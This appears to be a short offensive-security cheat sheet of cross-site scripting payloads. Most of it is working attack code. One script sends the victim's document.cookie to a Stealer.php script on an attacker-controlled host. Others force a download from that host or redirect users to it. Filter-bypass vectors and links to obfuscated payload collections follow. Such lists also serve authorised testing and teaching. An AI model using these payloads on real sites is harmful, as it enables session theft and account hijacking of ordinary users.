# Cross-Site Scripting

## Payloads

Grab cookies:
```
<script>document.write('<img src="http://<attackerip>/Stealer.php?cookie='%2Bdocument.cookie%2B"/>');</script>
```

Download files:
```
<script>
	var link = document.createElement('a'); 
	link.href = 'https://<attackerip>/file';
	link.download = ''; 
	document.body.appendChild(link);
	link.click();
</script>
```

Redirect User:
```
<script> window.location = "https://<attackerip>"; </script>
```

[XSSHunter](https://xsshunter.com)
Takes screenshots when payload executes and uploads them. This is used to detect if Blind XSS works (for e.g. a payload that only triggers when an admin logs in and views a special page).


More:
http://www.xss-payloads.com/payloads-list.html?c#category=capture

### Obfuscated Payloads

* https://github.com/foospidy/payloads/tree/master/other/xss
* https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
* JsFuck (www.jsfuck.com)
* PolyGlot Payloads (SecLists has some examples)

## Bypass Filters

* `<b onmouseover=alert('XSS')>Click Me!</b>`
* `<svg onload=alert(1)>`
* `<body onload='alert("XSS")'>`
* `<img src="http://<attackerip>" onerror=alert(1);>`
* `<SCRIPT SRC=http://localhost/xss.js?< B >`

## DOM-Based

XSS that is put into variables that rendered back into the page, strictly on the client side.

tags: xss cookies